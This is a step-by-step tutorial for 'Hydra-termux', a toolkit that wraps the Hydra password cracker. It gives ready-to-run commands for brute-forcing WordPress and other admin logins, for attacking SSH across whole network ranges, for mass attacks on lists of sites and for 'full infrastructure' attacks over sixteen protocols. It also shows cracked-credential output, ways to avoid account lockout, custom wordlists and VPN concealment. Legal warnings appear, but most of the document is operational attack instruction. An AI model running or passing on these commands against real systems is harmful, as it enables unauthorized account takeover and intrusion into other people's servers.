# Hydra-termux Step-by-Step Tutorial

## Table of Contents
1. [Quick Start Guide](#quick-start-guide)
2. [Web Admin Credential Attack Tutorial](#web-admin-credential-attack-tutorial)
3. [Multi-Target Attack Tutorial](#multi-target-attack-tutorial)
4. [Protocol Combination Tutorial](#protocol-combination-tutorial)
5. [Advanced Usage Examples](#advanced-usage-examples)
6. [Troubleshooting](#troubleshooting)

---

## Quick Start Guide

### Prerequisites
1. Install Hydra-termux:
```bash
bash install.sh
```

2. Ensure you have authorization to test the target

---

## Web Admin Credential Attack Tutorial

### Scenario 1: Attack WordPress Admin Panel

**IMPORTANT**: Only use on websites you own or have written permission to test!

#### Step 1: Identify Your Target
```bash
# Example target: http://example.com/wp-admin
TARGET_WEBSITE="http://example.com"
```

#### Step 2: Choose Your Attack Method

**Method A - Quick Library Script (Simplest)**

1. Open the WordPress quick script:
```bash
nano Library/wordpress_quick.sh
```

2. Edit ONLY the TARGET line (line 4):
```bash
TARGET="http://example.com"  # <-- Change this to your target
```

3. Save and run:
```bash
bash Library/wordpress_quick.sh
```

**Method B - Web Admin Script (More Control)**

1. Open the web admin attack script:
```bash
nano Library/web_quick.sh
```

2. Edit the TARGET line:
```bash
TARGET="http://example.com/wp-login.php"  # Full login URL
```

3. Run it:
```bash
bash Library/web_quick.sh
```

**Method C - Full-Featured Script (Maximum Control)**

1. Run with command-line options:
```bash
bash scripts/web_admin_attack.sh \
  -t http://example.com/wp-login.php \
  -u config/admin_usernames.txt \
  -w ~/wordlists/common_passwords.txt \
  -T 16 \
  -v
```

Options explained:
- `-t`: Target URL (the login page)
- `-u`: Username wordlist file
- `-w`: Password wordlist file
- `-T`: Number of threads (default: 16)
- `-v`: Verbose mode (show progress)

#### Step 3: Understanding the Results

The script will:
1. ✅ Check VPN connectivity (ensures you're protected)
2. 🔍 Detect the login form structure automatically
3. 🎯 Try common admin usernames (admin, webmaster, administrator)
4. 🔑 Test passwords from wordlists
5. 💾 Save successful credentials to `~/hydra-logs/results_web.json`

**Example Output:**
```
[*] Starting web admin attack on http://example.com/wp-login.php
[+] VPN check: Connected (IP: 10.8.0.2)
[*] Detected WordPress login form
[*] Trying username: admin
[*] Progress: 150/1000 passwords tested
[+] SUCCESS! Credentials found:
    Username: admin
    Password: Welcome123!
[*] Results saved to: ~/hydra-logs/results_web.json
```

#### Step 4: View Your Results

```bash
# View all successful attacks
bash scripts/results_viewer.sh

# View only web attacks
bash scripts/results_viewer.sh --protocol web

# Export to CSV
bash scripts/results_viewer.sh --protocol web --export web_results.csv
```

---

### Scenario 2: Get Admin Credentials for Specific Username

**Example**: You know the admin username is "webmaster@example.com"

#### Method 1: Using Web Script with Specific Username

1. Create a file with the specific username:
```bash
echo "webmaster@example.com" > /tmp/target_user.txt
```

2. Run the attack:
```bash
bash scripts/web_admin_attack.sh \
  -t http://example.com/admin/login.php \
  -u /tmp/target_user.txt \
  -w ~/wordlists/common_passwords.txt \
  -T 32 \
  -v
```

#### Method 2: Using Email Attack Script

1. Open the email attack script:
```bash
nano Library/email_quick.sh
```

2. Edit both EMAIL and TARGET:
```bash
EMAIL="webmaster@example.com"  # <-- Your target username
TARGET="http://example.com"     # <-- Your target website
```

3. Run it:
```bash
bash Library/email_quick.sh
```

#### Method 3: Direct Hydra Command

For maximum control:
```bash
# Create single-user file
echo "webmaster@example.com" > /tmp/single_user.txt

# Run targeted attack
hydra -L /tmp/single_user.txt \
      -P ~/wordlists/common_passwords.txt \
      -t 32 \
      http-post-form \
      "example.com/admin/login.php:username=^USER^&password=^PASS^:F=incorrect"
```

---

### Scenario 3: Attack Any Website Admin Panel

#### Step 1: Identify the Login Page

```bash
# Use web scanner to find admin panels
bash Library/web_directory_bruteforce.sh

# Edit the target in the script first:
nano Library/web_directory_bruteforce.sh
# Change: TARGET="http://example.com"
```

Common admin panel locations it will check:
- /admin
- /administrator
- /wp-admin
- /cpanel
- /phpmyadmin
- /admin.php
- /login.php

#### Step 2: Run Auto Web Attack

1. Open the web quick script:
```bash
nano Library/web_quick.sh
```

2. Change the TARGET:
```bash
TARGET="http://example.com"  # Script will auto-detect login page
```

3. Run:
```bash
bash Library/web_quick.sh
```

The script will:
- 🔍 Scan for common admin panel paths
- 🎯 Auto-detect form structure (GET/POST)
- 🔑 Test common admin credentials
- 💾 Save results automatically

---

## Multi-Target Attack Tutorial

### Attack Multiple Websites

#### Method 1: CIDR Range (for IP-based targets)

Attack all IPs in a network range:

```bash
# Edit multi-target SSH script
nano Library/multi_target_ssh.sh

# Change TARGET to a CIDR range:
TARGET="192.168.1.0/24"  # Scans 254 hosts

# Run it
bash Library/multi_target_ssh.sh
```

This will attack:
- 192.168.1.1
- 192.168.1.2
- ...
- 192.168.1.254

#### Method 2: Target List File (1000+ targets)

Attack thousands of targets from a file:

1. Create your target list:
```bash
cat > targets.txt << 'EOF'
http://site1.example.com
http://site2.example.com
http://site3.example.com
192.168.1.100
192.168.1.101
EOF
```

2. Edit the attack script:
```bash
nano Library/web_quick.sh

# Change TARGET to your file:
TARGET="targets.txt"
```

3. Run the bulk attack:
```bash
bash Library/web_quick.sh
```

Results for each target saved separately!

---

## Protocol Combination Tutorial

### Full Infrastructure Attack

Attack an entire organization's infrastructure:

#### Step 1: Run Network Discovery

```bash
# Edit network scanner
nano Library/network_quick.sh

# Set your target network:
TARGET="192.168.1.0/24"

# Run discovery
bash Library/network_quick.sh
```

#### Step 2: Run Full Infrastructure Attack

```bash
# Edit the combo script
nano Library/combo_full_infrastructure.sh

# Set your target:
TARGET="192.168.1.100"  # Or use CIDR range

# Run complete attack
bash Library/combo_full_infrastructure.sh
```

This attacks ALL protocols:
- ✅ SSH (port 22)
- ✅ FTP (port 21)
- ✅ Telnet (port 23)
- ✅ SMTP (port 25)
- ✅ HTTP/HTTPS (port 80/443)
- ✅ POP3 (port 110)
- ✅ IMAP (port 143)
- ✅ SMB (port 445)
- ✅ RDP (port 3389)
- ✅ MySQL (port 3306)
- ✅ PostgreSQL (port 5432)
- ✅ MSSQL (port 1433)
- ✅ MongoDB (port 27017)
- ✅ Redis (port 6379)
- ✅ LDAP (port 389)
- ✅ VNC (port 5900)

---

## Advanced Usage Examples

### Example 1: WordPress Site with Known Email

**Scenario**: Attack WordPress at example.com, username is admin@example.com

```bash
# Step 1: Create username file
echo "admin@example.com" > /tmp/wp_admin.txt

# Step 2: Run attack with specific username
bash scripts/web_admin_attack.sh \
  -t http://example.com/wp-login.php \
  -u /tmp/wp_admin.txt \
  -w ~/wordlists/rockyou.txt \
  -T 32 \
  --method POST \
  --failure "incorrect" \
  -v

# Step 3: Check results
bash scripts/results_viewer.sh --protocol web --target example.com
```

### Example 2: Corporate Network Audit

**Scenario**: Test corporate network 10.0.0.0/24

```bash
# Step 1: Discovery scan
bash Library/nmap_network_discovery.sh
# Edit: TARGET="10.0.0.0/24"

# Step 2: Full vulnerability scan
bash Library/nmap_vuln_scan.sh
# Edit: TARGET="10.0.0.0/24"

# Step 3: Attack all discovered services
bash Library/combo_full_infrastructure.sh
# Edit: TARGET="10.0.0.0/24"

# Step 4: Generate report
bash scripts/admin_auto_attack.sh -t 10.0.0.0/24 -r
```

### Example 3: Mail Server Attack

**Scenario**: Attack mail.example.com

```bash
# Use mail stack combo
nano Library/combo_mail_stack.sh

# Edit target:
TARGET="mail.example.com"

# Run complete mail attack
bash Library/combo_mail_stack.sh
```

Attacks:
- SMTP (send mail)
- POP3 (receive mail)
- IMAP (webmail)
- HTTP/HTTPS (webmail interface)

---

## Important Configuration

### VPN Protection

All scripts check VPN before attacking. To disable:

```bash
# Method 1: Skip VPN check flag
bash scripts/ssh_admin_attack.sh -t 192.168.1.100 --skip-vpn

# Method 2: Edit config
nano config/hydra.conf
# Set: vpn_check=false
```

### Adjust Thread Count

Higher threads = faster but riskier (may trigger lockouts)

```bash
# In config file
nano config/hydra.conf
# Change: default_threads=32  # Default is 16

# Or per-script
bash scripts/ssh_admin_attack.sh -t TARGET -T 64
```

### Custom Wordlists

```bash
# Download large wordlists
bash scripts/download_wordlists.sh

# Generate custom wordlist
bash scripts/wordlist_generator.sh
# Choose: company name + year combinations

# Use custom wordlist
bash scripts/ssh_admin_attack.sh \
  -t TARGET \
  -w /path/to/custom_wordlist.txt
```

---

## Troubleshooting

### Issue 1: "VPN not detected"

**Solution**:
```bash
# Check VPN status
bash scripts/vpn_check.sh

# Skip VPN check (testing only)
bash script.sh --skip-vpn
```

### Issue 2: "No results found"

**Possible causes**:
1. Account lockout (too many attempts)
2. Wrong login URL
3. Wordlist doesn't contain correct password

**Solutions**:
```bash
# Reduce threads to avoid lockout
-T 4

# Add delay between attempts
--delay 5

# Use larger wordlist
-w ~/wordlists/rockyou.txt
```

### Issue 3: "Permission denied"

**Solution**:
```bash
# Fix script permissions
chmod +x Library/*.sh
chmod +x scripts/*.sh
```

### Issue 4: "Hydra not found"

**Solution**:
```bash
# Reinstall
bash install.sh

# Or manual install
pkg install hydra
```

---

## Complete Workflow Example

### Full Website Admin Attack (Start to Finish)

```bash
# 1. Start VPN (example with OpenVPN)
sudo openvpn --config your-vpn.ovpn &

# 2. Verify VPN
bash scripts/vpn_check.sh

# 3. Download wordlists (first time only)
bash scripts/download_wordlists.sh

# 4. Scan target for admin panel
bash Library/web_directory_bruteforce.sh
# (Edit TARGET="http://example.com" first)

# 5. Run web admin attack
bash Library/web_quick.sh
# (Edit TARGET="http://example.com/admin" first)

# 6. Wait for results...
# Output: [+] SUCCESS! Username: admin, Password: Welcome123

# 7. View all results
bash scripts/results_viewer.sh --protocol web

# 8. Export report
bash scripts/results_viewer.sh --protocol web --export report.csv

# 9. Done! Credentials saved in ~/hydra-logs/results_web.json
```

---

## Legal & Ethical Reminder

⚠️ **CRITICAL LEGAL WARNING** ⚠️

These tools are **ONLY** for:
- ✅ Your own websites/servers
- ✅ Systems with **written authorization**
- ✅ Authorized penetration testing
- ✅ Security research with permission

**NEVER use on**:
- ❌ Systems you don't own
- ❌ Websites without permission
- ❌ Any unauthorized targets

**Legal consequences**:
- Federal charges (CFAA violations)
- Fines up to $250,000
- Prison time up to 10 years

**Always**:
1. Get written permission first
2. Document your authorization
3. Use VPN for legitimate testing
4. Report findings responsibly

---

## Quick Reference Card

### Most Common Use Cases

| Task | Command |
|------|---------|
| Attack WordPress | `bash Library/wordpress_quick.sh` (edit TARGET first) |
| Attack any website | `bash Library/web_quick.sh` (edit TARGET first) |
| Attack with email | `bash Library/email_quick.sh` (edit EMAIL + TARGET) |
| Attack SSH server | `bash Library/ssh_quick.sh` (edit TARGET first) |
| Scan network | `bash Library/network_quick.sh` (edit TARGET first) |
| Full infrastructure | `bash Library/combo_full_infrastructure.sh` (edit TARGET) |
| View results | `bash scripts/results_viewer.sh` |
| Check VPN | `bash scripts/vpn_check.sh` |

### All Scripts Location

- **Quick Scripts**: `Library/*.sh` (one-line-change)
- **Full Scripts**: `scripts/*.sh` (command-line options)
- **Results**: `~/hydra-logs/results_*.json`
- **Config**: `config/hydra.conf`

---

## Support & Documentation

- **Full Usage Guide**: `docs/USAGE.md`
- **Protocol Guide**: `Library/PROTOCOL_GUIDE.md`
- **Examples**: `docs/EXAMPLES.md`
- **Library Reference**: `Library/README_COMPLETE.md`

For help with any script:
```bash
bash script_name.sh --help
```

---

**Remember**: With great power comes great responsibility. Use ethically! 🛡️
